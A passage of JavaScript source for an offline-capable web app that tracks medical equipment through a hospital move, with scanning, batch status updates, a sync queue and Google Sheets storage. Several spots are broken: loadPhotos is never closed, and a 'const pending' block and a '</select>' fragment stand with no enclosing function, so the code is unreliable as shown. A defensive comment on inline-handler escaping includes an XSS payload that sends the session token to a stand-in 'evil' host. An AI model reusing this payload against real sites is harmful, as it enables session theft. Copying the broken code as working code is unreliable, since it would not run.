    r.onerror = () => rej(r.error);
  });
  const st = async (n,m) => { if(!db) await open(); return db.transaction(n,m).objectStore(n); };
  const w = req => new Promise((res,rej)=>{ req.onsuccess=()=>res(req.result); req.onerror=()=>rej(req.error); });
  return {
    all:  async n => w((await st(n,'readonly')).getAll()),
    get:  async (n,k) => w((await st(n,'readonly')).get(k)),
    put:  async (n,v) => w((await st(n,'readwrite')).put(v)),
    del:  async (n,k) => w((await st(n,'readwrite')).delete(k)),
    clear:async n => w((await st(n,'readwrite')).clear()),
    putMany: async (n,vals) => {
      const s = await st(n,'readwrite');
      return new Promise((res,rej)=>{ vals.forEach(v=>s.put(v));
        s.transaction.oncomplete=()=>res(); s.transaction.onerror=()=>rej(s.transaction.error); });
    }
  };
})();

/* ════════════════════════════════ api ════════════════════════════════
   Reads are GET. Writes are POST with content-type text/plain — deliberately, because
   application/json would trigger a CORS preflight that Apps Script cannot answer. The
   body is still JSON; only the header differs. */
const api = {
  configured: () => !!apiUrl,
  /* Reads are POSTs. A GET would put the credential in the URL, and URLs end up in the
     Apps Script execution transcript, in browser history and in proxy logs. */
  async get(params){ return this.post(params); },
  async ping(){
    const u = new URL(apiUrl);
    u.searchParams.set('action', 'ping');
    const r = await fetch(u, { method:'GET', redirect:'follow' });
    if(!r.ok) throw new Error('Server returned ' + r.status);
    return r.json();
  },
  async post(body){
    const r = await fetch(apiUrl, {
      method:'POST', redirect:'follow',
      headers:{ 'Content-Type':'text/plain;charset=utf-8' },
      body: JSON.stringify(body)
    });
    if(!r.ok) throw new Error('Server returned ' + r.status);
    return r.json();
  }
};

/* ═════════════════════════════ derivations ═══════════════════════════ */
const t = v => (v==null?'':String(v)).trim();

function verdictOf(r){
  const v = t(r[KEY.verdict]).toLowerCase();
  return v==='yes' ? 'move' : v==='no' ? 'nomove' : v==='unsure' ? 'unsure' : 'unknown';
}
function deptOf(r){
  const c = t(r[KEY.from]);
  return c ? (c.split(' - ')[0].trim() || 'Unassigned') : 'Unassigned';
}
function floorOf(r){
  const f = t(r[KEY.floor]).replace(/\s+/g,' '), l = f.toLowerCase();
  if(/^decom/.test(l)) return 'Decommission';
  if(l === 'hoxton') return 'Hoxton';
  if(/^re[cl]o[cl]/.test(l)) return 'Relocate';
  return f;
}
function destOf(r){
  const f = floorOf(r), l = t(r[KEY.to]);
  if(!f && !l) return '';
  if(f && l && l.toLowerCase() !== f.toLowerCase()) return l + ' · ' + f;
  return l || f;
}
function conflictOf(r){
  const v = verdictOf(r), f = floorOf(r);
  if(v==='move' && ['Decommission','Hoxton','Relocate'].includes(f))
    return 'Marked to transfer but the destination floor reads "' + f + '"';
  if(v==='move' && !t(r[KEY.to]) && !f) return 'No destination recorded';
  if(v==='unknown') return 'Transfer decision missing';
  return '';
}
function stageOf(r){
  const s = t(r[KEY.stage]);
  if(!s) return STAGES[0];
  if(STAGES.includes(s)) return s;
  return LEGACY_STAGE[s.toLowerCase()] || STAGES[0];
}
const stageIdx  = r => Math.max(0, STAGES.indexOf(stageOf(r)));
const isDone    = r => stageOf(r) === 'Installed';
const inScope   = r => verdictOf(r) === 'move';
const issueOf   = r => t(r[KEY.issue]);

/* ══════════════════════════════ helpers ══════════════════════════════ */
const $  = s => document.querySelector(s);
const $$ = s => [...document.querySelectorAll(s)];
const esc = s => t(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
/* Same escaping WITHOUT the trim. Column names carry meaningful whitespace — the
   workbook's transport column really is named "...(Mover / OEM / Internal) " with a
   trailing space — and trimming it in a form field's name breaks every edit to it. */
const escA = s => (s == null ? '' : String(s)).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));

/**
 * A value going INTO an inline event handler, e.g. onclick="go('asset', HERE )".
 *
 * esc() is not enough there and neither is escaping the apostrophe: the browser HTML-
 * decodes the attribute FIRST and only then parses the result as JavaScript, so &#39;
 * turns back into a quote and breaks out of the string. An asset whose Equipment No is
 *     x');fetch('//evil/?'+sessionStorage.getItem('oriel.session'));//
 * would then run in every viewer's browser — and asset numbers come from a spreadsheet
 * anyone with the key can edit, or from an imported workbook.
 *
 * JSON.stringify produces a complete, quoted JS literal with backslashes and quotes
 * already escaped; escA then makes it attribute-safe. Both layers are required.
 */
const jsArg = v => escA(JSON.stringify(v == null ? '' : String(v)));
const uuid = () => (crypto.randomUUID ? crypto.randomUUID()
  : 'x' + Date.now().toString(36) + Math.random().toString(36).slice(2,10));
let toastTimer;
function toast(msg){
  const el = $('#toast'); el.textContent = msg; el.classList.add('on');
  clearTimeout(toastTimer); toastTimer = setTimeout(()=>el.classList.remove('on'), 2400);
}
function buzz(p){ if(navigator.vibrate) navigator.vibrate(p || [14,40,14]); }
function openSheet(html){ $('#sheetBody').innerHTML = html; $('#scrim').classList.add('on'); $('#sheet').classList.add('on'); }
function closeSheet(){ $('#scrim').classList.remove('on'); $('#sheet').classList.remove('on'); }
function fmtWhen(iso){
  const d = new Date(iso);
  if(isNaN(d)) return t(iso);
  return d.toLocaleDateString('en-GB',{day:'numeric',month:'short'}) + ' ' +
         d.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
}

/* ═══════════════════════════════ boot ════════════════════════════════ */
async function boot(){
  loadSession();
  /* When the build pins an API_URL it wins outright. Otherwise anything that can write
     to localStorage — an XSS, a shared machine — could redirect the next unlock and
     collect the master key as it is typed. */
  apiUrl = CONFIG.API_URL || localStorage.getItem('oriel.api') || '';
  sheetId = localStorage.getItem('oriel.sheetId') || '';

  PHOTOS = (await DB.get('meta','photos'))?.v || {};
  const meta = await DB.get('meta','cols');
  if(meta){
    COLS = meta.v;
    (await DB.all('assets')).forEach(r => ASSETS.set(r._id, r));
    REV = (await DB.get('meta','rev'))?.v || '0';
  }
  if(!ASSETS.size) await loadSeed(); else usingSnapshot = !(await DB.get('meta','live'))?.v;
  const bm = await DB.get('meta','batch');
  if(bm){ batch = bm.v.ids || []; batchMode = !!bm.v.on; batchTarget = bm.v.target || 'In transit'; }

  reindex(); paintLock(); net(); render();
  go('scan');

  if(api.configured()){ api.ping().then(r => { HEALTH = r; }).catch(()=>{});
    refresh({quiet:true}); drain(); loadPhotos(); }
  else if(!localStorage.getItem('oriel.seenSetup')) setTimeout(promptSetup, 700);
}

/** Bundled snapshot of the register, used until the Google Sheet is connected. */
async function loadSeed(){
  if(!('DecompressionStream' in window))
    throw new Error('This browser cannot unpack the bundled register. Use Chrome, Edge, or Safari 16.4+.');
  const b64 = document.getElementById('seed').textContent.trim();
  const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  const buf = await new Response(new Blob([bin]).stream().pipeThrough(new DecompressionStream('gzip'))).arrayBuffer();
  const { c, r } = JSON.parse(new TextDecoder().decode(buf));
  await ingest(c, r, '0');
}

async function ingest(cols, rows, rev){
  COLS = cols.slice();
  ASSETS.clear();
  const recs = rows.map(row => {
    const o = {};
    cols.forEach((c,i) => o[c] = t(row[i]));
    o._id = t(o[KEY.id]) || (t(o[KEY.serial]) ? 'SN:' + t(o[KEY.serial]) : '');
    return o;
  }).filter(o => o._id);
  recs.forEach(r => ASSETS.set(r._id, r));
  await DB.clear('assets');
  await DB.putMany('assets', recs);
  await DB.put('meta', { k:'cols', v:COLS });
  await DB.put('meta', { k:'rev', v:rev });
  await DB.put('meta', { k:'syncedAt', v:new Date().toISOString() });
  REV = rev;
}

function reindex(){
  SERIALS.clear();
  for(const r of ASSETS.values()){
    const s = t(r[KEY.serial]).toUpperCase();
    if(s && !SERIALS.has(s)) SERIALS.set(s, r._id);
  }
}

/** Pull the register. Cheap when nothing has changed — the server compares revisions. */
async function refresh(opts = {}){
  if(!api.configured()) { if(!opts.quiet) toast('No Google Sheet connected yet'); return; }
  if(!navigator.onLine) { if(!opts.quiet) toast('Offline — showing the cached register'); return; }
  try{
    if(!opts.quiet) toast('Checking for changes…');
    const res = await api.get({ action:'get', since:REV, key: cred() });
    if(!res.ok) throw new Error(res.error || 'Server refused the request');
    if(res.unchanged){ if(!opts.quiet) toast('Already up to date'); return; }

    const bin = Uint8Array.from(atob(res.gz), c => c.charCodeAt(0));
    const buf = await new Response(new Blob([bin]).stream().pipeThrough(new DecompressionStream('gzip'))).arrayBuffer();
    const { c, r } = JSON.parse(new TextDecoder().decode(buf));
    await ingest(c, r, String(res.rev));
    usingSnapshot = false;
    await DB.put('meta', { k:'live', v:true });
    reindex();
    if(!opts.quiet) toast('Register updated · ' + ASSETS.size.toLocaleString('en-GB') + ' assets');
    render();
    if(route === 'asset' && currentAsset) renderAsset(currentAsset);
    if(route === 'dash') renderDash();
    if(route === 'find') renderFind();
    if(route === 'data') renderData();
  }catch(e){
    if(!opts.quiet) toast('Could not reach the sheet: ' + e.message);
  }
}

async function loadPhotos(){

/** Shrink before upload. A phone photo is 4 MB; 1200px of JPEG is about 150 KB and is
    more than enough to recognise a device across a room. */
function shrink(file, max = 1200, quality = 0.82){
  return new Promise((res, rej) => {
    const fr = new FileReader();
    fr.onerror = () => rej(new Error('Could not read that file'));
    fr.onload = () => {
      const img = new Image();
      img.onerror = () => rej(new Error('That file is not an image'));
      img.onload = () => {
        const scale = Math.min(1, max / Math.max(img.width, img.height));
        const c = document.createElement('canvas');
        c.width = Math.round(img.width * scale);
        c.height = Math.round(img.height * scale);
        c.getContext('2d').drawImage(img, 0, 0, c.width, c.height);
        res(c.toDataURL('image/jpeg', quality));
      };
      img.src = fr.result;
    };
    fr.readAsDataURL(file);
  });
}

/* ══════════════════════════ write path + queue ═══════════════════════
   Every write is applied locally first so the interface never waits on the network,
   then queued. The queue drains in order, oldest first, and each operation carries a
   clientId so a replay after a dropped connection cannot apply twice. */
async function submit(op, optimistic){
  const keyless = op.action === 'bulkStage' && openBatch();
  if(!session && !keyless) { openUnlock(); return false; }
  const item = { clientId: uuid(), op, occurredAt: new Date().toISOString(), attempts: 0 };
  if(optimistic) { await DB.put('assets', optimistic); }
  await DB.put('queue', item);
  paintQueue();
  drain();
  return true;
}

let draining = false;
async function drain(){
  if(draining || !navigator.onLine || !api.configured()) return;
  const items0 = await DB.all('queue');
  if(!items0.length) return;
  // Without a session we can still send keyless batch updates; anything else waits.
  if(!session && !(openBatch() && items0.every(i => i.op.action === 'bulkStage'))) return;
  draining = true;
  try{
    const items = (await DB.all('queue')).sort((a,b) => a.occurredAt.localeCompare(b.occurredAt));
    if(!items.length) return;
    const res = await api.post({
      action: 'batch', key: cred(), by: whoAmI() || 'unknown',
      ops: items.map(i => {
        const { _localId, ...op } = i.op;          // client-only hint, never sent
        return { ...op, clientId: i.clientId, occurredAt: i.occurredAt };
      })
    });
    if(!res.ok){
      if(res.code === 'NEED_NAME'){ askName(); return; }
      if(res.code === 'RATE'){ toast(res.error); return; }
      if(res.code === 'BAD_KEY' || res.code === 'LOCKED'){
        saveSession(null);
        toast('Your session has ended. Unlock again to send ' +
              items.length + ' pending change' + (items.length === 1 ? '' : 's') + '.');
      }
      return;
    }
    let rejected = 0;
    const remap = new Map();
    for(const r of res.results || []){
      if(r.result && r.result.ok){
        await DB.del('queue', r.clientId);
        // A created asset gets its real number from the sheet, not from this device.
        const local = (items.find(i => i.clientId === r.clientId) || {}).op;
        if(local && local.action === 'create' && r.result.equipmentNo){
          const provisional = local._localId;
          if(provisional && provisional !== r.result.equipmentNo) remap.set(provisional, r.result.equipmentNo);
        }
      }
      else {
        // A rejection on merit will never succeed on retry — drop it and say so.
        rejected++;
        await DB.del('queue', r.clientId);
        console.warn('Rejected', r.clientId, r.result && r.result.error);
      }
    }
    paintQueue();
    if(rejected) toast(rejected + ' change(s) were rejected by the sheet');
    REV = '0';                 // force a re-read so local state matches the sheet
    await refresh({ quiet:true });
    for(const [from, to] of remap){
      ASSETS.delete(from);
      recent = recent.map(x => x === from ? to : x);
      if(currentAsset === from){ currentAsset = to; if(route === 'asset') go('asset', to); }
    }
  }catch(e){
    // Offline or server trouble. Items stay queued in order and go again later.
  }finally{
    draining = false;
    paintQueue();
  }
}

/* ══════════════════════════════ actions ══════════════════════════════ */
async function setStage(id, stage){
  const r = ASSETS.get(id); if(!r) return;
  if(!canStatus()) return openUnlock('Unlock to update move status.');
  if(stageOf(r) === stage) return;

  const copy = { ...r, [KEY.stage]: stage, [KEY.movedAt]: new Date().toISOString(), [KEY.movedBy]: session.name };
  ASSETS.set(id, copy);
  await submit({ action:'stage', equipmentNo:id, stage }, copy);
  buzz(); toast('Marked ' + stage.toLowerCase());
  renderAsset(id); renderTodayStats();
}

async function applyEdits(id, changes, reason){
  const r = ASSETS.get(id); if(!r) return;
  if(!canEdit()) return openUnlock('Unlock to edit asset details.');
  const diffs = Object.entries(changes).filter(([f,v]) => t(r[f]) !== t(v));
  if(!diffs.length) return toast('Nothing changed');

  const copy = { ...r };
  diffs.forEach(([f,v]) => copy[f] = t(v));
  copy[KEY.movedBy] = session.name;
  ASSETS.set(id, copy);
  await submit({ action:'edit', equipmentNo:id, changes: Object.fromEntries(diffs.map(([f,v])=>[f,t(v)])), reason }, copy);
  reindex();
  toast(diffs.length + (diffs.length === 1 ? ' field updated' : ' fields updated'));
  renderAsset(id);
}

async function setIssue(id, issue){
  const r = ASSETS.get(id); if(!r) return;
  if(!canStatus()) return openUnlock('Unlock to flag issues.');
  const copy = { ...r, [KEY.issue]: t(issue), [KEY.movedBy]: session.name };
  ASSETS.set(id, copy);
  await submit({ action:'issue', equipmentNo:id, issue: t(issue) }, copy);
  toast(issue ? 'Issue flagged' : 'Issue cleared');
  renderAsset(id);
}

async function createAsset(fields, reason){
  if(!canEdit()) return openUnlock('Unlock to add an asset.');
  let id = t(fields[KEY.id]);
  if(id && ASSETS.has(id)) return toast('Asset ' + id + ' is already in the register');
  if(!id) id = 'NEW-' + String(Date.now()).slice(-6);   // server assigns the real NEW-#### id

  const rec = {}; COLS.forEach(c => rec[c] = t(fields[c]));
  rec._id = id;
  rec[KEY.id] = id;
  rec[KEY.stage] = STAGES[0];
  rec[KEY.movedAt] = new Date().toISOString();
  rec[KEY.movedBy] = session.name;
  rec._pending = true;
  ASSETS.set(id, rec);

  await submit({ action:'create', fields: { ...fields, [KEY.id]: t(fields[KEY.id]) || '' },
                 reason, _localId: id }, rec);
  reindex(); closeSheet(); buzz();
  toast('Asset added' + (t(fields[KEY.id]) ? '' : ' — the sheet will assign its number'));
  go('asset', id);
}

async function doUnlock(){
  const name = t($('#uName').value), key = t($('#uKey').value).toUpperCase();
  const err = m => $('#unlockErr').innerHTML = '<div class="err">' + esc(m) + '</div>';
  if(!name) return err('Enter your name — it is recorded against every change.');
  if(!key)  return err('Enter the master key.');

  if(!api.configured()){
    return err('No Google Sheet is connected yet, so there is no key to check against. Connect one under Data first.');
  }
  $('#uGo').textContent = 'Checking…'; $('#uGo').disabled = true;
  try{
    const res = await api.post({ action:'unlock', key, by: name });
    if(!res.ok){ $('#uGo').textContent = 'Unlock'; $('#uGo').disabled = false;
      return err(res.error || 'That key was not accepted.'); }
    localStorage.setItem('oriel.name', name);
    // Deliberately not keeping `key`.
    saveSession({ token: res.token, name, role: res.role,
                  canEdit: !!res.canEdit, canStatus: !!res.canStatus, at: Date.now() });
    closeSheet(); buzz();
    toast(res.canEdit ? 'Unlocked · Clinical Engineering' : 'Unlocked · move team, status updates only');
    drain();
    render();                       // batch panel, header chip and stats all change with the role
    if(route === 'asset' && currentAsset) renderAsset(currentAsset);
    if(route === 'data') renderData();
    if(route === 'find') renderFind();
  }catch(e){
    $('#uGo').textContent = 'Unlock'; $('#uGo').disabled = false;
    err('Could not reach the sheet. Check your connection and the web app URL.');
  }
}

  const pending = (await DB.all('queue')).length;
  openSheet(`

    <p class="sub">Unlocked as <b>${esc(session.role)}</b>. Changes are saved to the Google Sheet with your name against them.</p>
    ${pending ? `<div class="err">${pending} change${pending===1?'':'s'} still waiting to reach the sheet. Locking now keeps them queued, but they will not send until someone unlocks again.</div>` : ''}
    <button class="btn btn-quiet" onclick="closeSheet();go('data')">Data and sync</button>
    <div style="height:10px"></div>
    <button class="btn btn-danger" onclick="lockNow()">Lock — back to view only</button>`);
}
function lockNow(){
  saveSession(null); closeSheet(); toast('Locked · view only');
  render();
  if(route === 'asset' && currentAsset) renderAsset(currentAsset);
  if(route === 'data') renderData();
  if(route === 'find') renderFind();
}

/* ═══════════════════════════════ routing ═════════════════════════════ */
function go(r, arg){
  route = r;
  $$('.screen').forEach(s => s.classList.remove('active'));
  $$('.tabs button').forEach(b => b.classList.toggle('on', b.dataset.goto === r));
  if(r === 'asset'){
    currentAsset = arg;
    $('#s-asset').classList.add('active');
    renderAsset(arg);
    $$('.tabs button').forEach(b => b.classList.toggle('on', b.dataset.goto === 'scan'));
  } else {
    $('#s-' + r).classList.add('active');
  }
  if(r === 'dash') renderDash();
  if(r === 'find') renderFind();
  if(r === 'data') renderData();
  if(r === 'scan'){ renderTodayStats(); renderRecent(); renderBatch();
    if(wedge) setTimeout(()=>$('#scanInput').focus(), 80); }
  paintLock();
  window.scrollTo(0,0);
}

/* ════════════════════════════════ scan ═══════════════════════════════ */
function lookup(raw){
  const s = t(raw); if(!s) return null;
  return ASSETS.get(s)
      || ASSETS.get(s.replace(/^0+/,''))
      || (SERIALS.has(s.toUpperCase()) ? ASSETS.get(SERIALS.get(s.toUpperCase())) : null);
}
function doScan(raw){
  if(batchMode){ $('#scanInput').value = ''; return batchAdd(raw); }
  const rec = lookup(raw);
  if(!rec){
    buzz([60,60,60]);
    openSheet(`<h2>No match for ${esc(raw)}</h2>
      <p class="sub">Nothing in the register uses that equipment or serial number.</p>
      <button class="btn btn-primary" onclick="closeSheet();go('find');document.getElementById('q').value=${jsArg(t(raw))};F.q=${jsArg(t(raw))};renderFind()">Search the register</button>
      <div style="height:8px"></div>
      ${canEdit() ? `<button class="btn btn-ghost" onclick="closeSheet();openAdd(${jsArg(t(raw))})">Add it as a new asset</button><div style="height:8px"></div>` : ''}
      <button class="btn btn-quiet" onclick="closeSheet()">Try again</button>`);
    return;
  }
  recent = [rec._id, ...recent.filter(x => x !== rec._id)].slice(0,8);
  buzz(); $('#scanInput').value = ''; stopCam();
  go('asset', rec._id);
}
function renderRecent(){
  const w = $('#recentWrap');
  if(!recent.length) return w.classList.add('hide');
  w.classList.remove('hide');
  $('#recent').innerHTML = recent.map(id => {
    const r = ASSETS.get(id); if(!r) return '';
    return `<button onclick="go(${jsArg('asset')},${jsArg(id)})">${esc(id)} · ${esc(t(r[KEY.model]).slice(0,18))}</button>`;
  }).join('');
}

let camStream = null, camLoop = null;
async function startCam(){
  if(!('BarcodeDetector' in window)){
    return openSheet(`<h2>Camera scanning not supported</h2>
      <p class="sub">This browser has no built-in barcode reader — iPhones are the usual case. Use a handheld scanner, which types into the box and presses enter, or key the number in.</p>
      <button class="btn btn-primary" onclick="closeSheet()">Got it</button>`);
  }
  try { camStream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'environment' } }); }
  catch { return toast('Camera permission denied'); }
  $('#camHost').innerHTML =
    `<div class="camframe"><video id="cam" playsinline muted autoplay></video><div class="reticle"></div></div>
     <button class="btn btn-quiet" id="btnCamStop">Stop camera</button>`;
  $('#btnCamStop').onclick = stopCam;
  const v = $('#cam'); v.srcObject = camStream; await v.play();
  const det = new BarcodeDetector({ formats:['code_128','code_39','qr_code','ean_13','data_matrix','codabar','itf'] });
  camLoop = setInterval(async () => {
    try {
      const codes = await det.detect(v);
      // In batch mode the camera stays on and keeps collecting; batchAdd debounces
      // repeat reads of the same label.
      if(codes.length) doScan(codes[0].rawValue);
    } catch {}
  }, 320);
}
function stopCam(){
  clearInterval(camLoop); camLoop = null;
  if(camStream){ camStream.getTracks().forEach(x => x.stop()); camStream = null; }
  $('#camHost').innerHTML = `<button class="btn btn-teal" id="btnCam">Use camera</button>`;
  $('#btnCam').onclick = startCam;
}
function toggleWedge(){
  wedge = !wedge;
  $('#btnWedge').classList.toggle('sel', wedge);
  $('#btnWedge').textContent = wedge ? 'Handheld scanner on' : 'Handheld scanner';
  if(wedge) $('#scanInput').focus(); else $('#scanInput').blur();
  toast(wedge ? 'Scan box will stay ready' : 'Handheld mode off');
}

/* ═══════════════════════════ batch scanning ═════════════════════════
   Scan a trolley-load, then set them all at once. Built for the move itself, where
   somebody is standing in a corridor with forty items and no patience. */

async function saveBatch(){
  await DB.put('meta', { k:'batch', v:{ ids:batch, on:batchMode, target:batchTarget } });
}

function toggleBatch(){
  batchMode = !batchMode;
  $('#btnBatch').classList.toggle('sel', batchMode);
  $('#btnBatch').textContent = batchMode ? 'Batch mode on' : 'Batch mode';
  saveBatch(); renderBatch();
  toast(batchMode ? 'Scans will collect in a list' : 'Back to single scanning');
}

/** A short click, so you know a scan landed without looking at the screen. */
function blip(ok){
  try{
    const C = window.AudioContext || window.webkitAudioContext; if(!C) return;
    blip.ctx = blip.ctx || new C();
    const o = blip.ctx.createOscillator(), g = blip.ctx.createGain();
    o.frequency.value = ok ? 880 : 220;
    g.gain.value = 0.06;
    o.connect(g); g.connect(blip.ctx.destination);
    o.start(); o.stop(blip.ctx.currentTime + (ok ? 0.07 : 0.22));
  }catch(e){}
}

function batchAdd(raw){
  const code = t(raw);
  // The camera fires several times a second; ignore the same code for two seconds.
  if(code === lastScan.code && Date.now() - lastScan.at < 2000) return;
  lastScan = { code, at: Date.now() };

  const rec = lookup(code);
  if(!rec){
    blip(false); buzz([60,60,60]);
    toast('Not in the register: ' + code);
    return;
  }
  if(batch.includes(rec._id)){
    blip(false); buzz([30]);
    toast('Already scanned · ' + (t(rec[KEY.model]) || rec._id));
    return;
  }
  batch = [rec._id, ...batch];
  blip(true); buzz();
  saveBatch(); renderBatch();
}

function batchRemove(id){ batch = batch.filter(x => x !== id); saveBatch(); renderBatch(); }
function batchSetTarget(s){ batchTarget = s; saveBatch(); renderBatch(); }

function batchClear(){
  if(!batch.length) return;
  openSheet(`<h2>Clear ${batch.length} scanned asset${batch.length === 1 ? '' : 's'}?</h2>
    <p class="sub">Nothing has been sent to the Sheet yet, so this just empties the list.</p>
    <div class="btn-row">
      <button class="btn btn-quiet" onclick="closeSheet()">Keep them</button>
      <button class="btn btn-danger" onclick="closeSheet();batch=[];saveBatch();renderBatch()">Clear</button>
    </div>`);
}

/** Split the list into what can actually be advanced and what cannot. */
function batchSplit(){
  const ok = [], blocked = [];
  for(const id of batch){
    const r = ASSETS.get(id);
    if(!r) continue;
    if(batchTarget !== STAGES[0] && verdictOf(r) !== 'move')
      blocked.push({ r, why: { nomove:'Do not move', unsure:'On hold', unknown:'No decision' }[verdictOf(r)] });
    else ok.push(r);
  }
  return { ok, blocked };
}

function renderBatch(){
  const panel = $('#batchPanel');
  if(!panel) return;
  if(!batchMode){ panel.classList.add('hide'); panel.innerHTML = ''; return; }
  panel.classList.remove('hide');

  const { ok, blocked } = batchSplit();
  const already = ok.filter(r => stageOf(r) === batchTarget).length;
  const willChange = ok.length - already;

  panel.innerHTML = `
    <div class="batchbar">
      <span class="n tnum">${batch.length}</span>
      <span>scanned</span>
      ${batch.length ? `<button onclick="batchClear()">Clear all</button>` : ''}
    </div>

    ${batch.length ? `
      <div class="card tight">
        <p class="eyebrow">Set all of these to</p>
        <div class="batchtarget">
          ${STAGES.map(s => `<button class="${s === batchTarget ? 'sel' : ''}"
            onclick="batchSetTarget(${jsArg(s)})">${esc(s)}</button>`).join('')}
        </div>

        ${blocked.length ? `<div class="bwarn">${blocked.length} of these will be left alone —
          the register says they are not transferring. They stay in the list so you can see which.</div>` : ''}
        ${already ? `<div class="bwarn">${already} ${already === 1 ? 'is' : 'are'} already
          "${esc(batchTarget)}" and will be skipped.</div>` : ''}

        <div class="batchlist">
          ${batch.map(id => {
            const r = ASSETS.get(id);
            if(!r) return '';
            const bad = batchTarget !== STAGES[0] && verdictOf(r) !== 'move';
            return `<div class="brow ${bad ? 'bad' : ''}">
              <span class="bar"></span>
              <span class="b">
                <span class="b1">${esc(r[KEY.model]) || esc(id)}</span>
                <span class="b2">${esc(id)} · ${bad
                  ? esc({ nomove:'Do not move', unsure:'On hold', unknown:'No decision' }[verdictOf(r)])
                  : esc(stageOf(r))}</span>
              </span>
              <button class="x" onclick="batchRemove(${jsArg(id)})" aria-label="Remove">×</button>
            </div>`;
          }).join('')}
        </div>

        ${canBatch()
          ? `<button class="btn btn-go" ${willChange ? '' : 'disabled'}
               onclick="batchApply()">Mark ${willChange} as ${esc(batchTarget.toLowerCase())}</button>
             ${!canStatus() ? `<p class="was" style="margin-top:9px">Signed in as
               <b>${esc(whoAmI() || 'not set')}</b>${whoAmI()
                 ? ` · <button onclick="askName(true)" style="text-decoration:underline;color:var(--indigo);font-weight:700">change</button>`
                 : ''}. Your name goes on every change.</p>` : ''}`
          : `<button class="btn btn-primary" onclick="openUnlock('Enter your move-team key to update statuses.')">
               Unlock to mark ${willChange} as ${esc(batchTarget.toLowerCase())}</button>
             <p class="was" style="margin-top:9px">Scanning works without a key. Sending the update needs one,
               so every change carries a name.</p>`}
      </div>`
    : `<div class="card tight"><p style="margin:0;color:var(--muted);font-size:14px">
        Scan assets and they will collect here. Nothing is sent until you press the button.</p></div>`}`;
}

async function batchApply(){
  if(!canBatch()) return openUnlock('Unlock to update move status.');
  if(!canStatus() && !whoAmI()) return askName();
  const { ok, blocked } = batchSplit();
  const targets = ok.filter(r => stageOf(r) !== batchTarget);
  if(!targets.length) return toast('Nothing to change');

  openSheet(`
    <h2>Mark ${targets.length} asset${targets.length === 1 ? '' : 's'} as ${esc(batchTarget.toLowerCase())}?</h2>
    <p class="sub">Recorded against your name, one audit entry each.</p>
    ${blocked.length ? `<div class="bwarn">${blocked.length} scanned asset${blocked.length === 1 ? '' : 's'}
      will be left alone: ${blocked.slice(0,4).map(b => esc(b.r._id) + ' (' + esc(b.why) + ')').join(', ')}${blocked.length > 4 ? '…' : ''}</div>` : ''}
    <div class="btn-row">
      <button class="btn btn-quiet" onclick="closeSheet()">Cancel</button>
      <button class="btn btn-go" onclick="closeSheet();batchCommit()">Confirm</button>
    </div>`);
}

/** No key needed, but we still need to know who. One question, remembered on the device. */
function askName(changing){
  openSheet(`
    <h2>Who is doing this?</h2>
    <p class="sub">No password needed. Your name goes on every status change so the register
      shows who moved what.</p>
    <label class="fld"><span class="lb">Name or team</span>
      <input id="nmIn" autocomplete="name" placeholder="e.g. Dave — Britannia Movers"
             value="${escA(whoAmI())}"></label>
    <div class="btn-row">
      <button class="btn btn-quiet" onclick="closeSheet()">Cancel</button>
      <button class="btn btn-primary" id="nmGo">${changing ? 'Save' : 'Continue'}</button>
    </div>`);
  const save = () => {
    const v = t($('#nmIn').value);
    if(v.length < 2) return toast('Please put a name in');
    localStorage.setItem('oriel.name', v);
    closeSheet(); renderBatch();
    if(!changing) batchApply();
  };
  $('#nmGo').onclick = save;
  $('#nmIn').addEventListener('keydown', e => { if(e.key === 'Enter') save(); });
  setTimeout(() => $('#nmIn').focus(), 120);
}

async function batchCommit(){
  const { ok } = batchSplit();
  const targets = ok.filter(r => stageOf(r) !== batchTarget);
  const ids = targets.map(r => r._id);
  const when = new Date().toISOString();

  const who = whoAmI() || 'unknown';
  for(const r of targets){
    ASSETS.set(r._id, { ...r, [KEY.stage]: batchTarget, [KEY.movedAt]: when, [KEY.movedBy]: who });
  }
  await DB.putMany('assets', targets.map(r => ASSETS.get(r._id)));
  await submit({ action:'bulkStage', ids, stage: batchTarget, reason:'Bulk update' });

  buzz([20,50,20]); blip(true);
  toast(ids.length + ' marked ' + batchTarget.toLowerCase());
  batch = batch.filter(id => !ids.includes(id));
  await saveBatch();
  renderBatch(); renderTodayStats();
}

     </select>` +
    mk('verdict','Transfer',['Yes','No','Unsure']) +

function matches(r){
  if(F.site && t(r[KEY.site]) !== F.site) return false;
  if(F.dept && deptOf(r) !== F.dept) return false;
  if(F.floor && floorOf(r) !== F.floor) return false;
  if(F.stage && stageOf(r) !== F.stage) return false;
  if(F.verdict){ const map = { Yes:'move', No:'nomove', Unsure:'unsure' }; if(verdictOf(r) !== map[F.verdict]) return false; }
  if(F.flag === 'nodest' && !(inScope(r) && !destOf(r))) return false;
  if(F.flag === 'issue' && !issueOf(r)) return false;
  if(F.flag === 'conflict' && !conflictOf(r)) return false;
  if(F.flag === 'todo' && !(inScope(r) && stageIdx(r) === 0)) return false;
  if(F.q){
    const q = F.q.toLowerCase();
    const hay = [r._id, r[KEY.serial], r[KEY.model], r[KEY.brand], r[KEY.cat], r[KEY.from], r[KEY.to]]
      .join(' ').toLowerCase();
    if(!hay.includes(q)) return false;
  }
  return true;
}
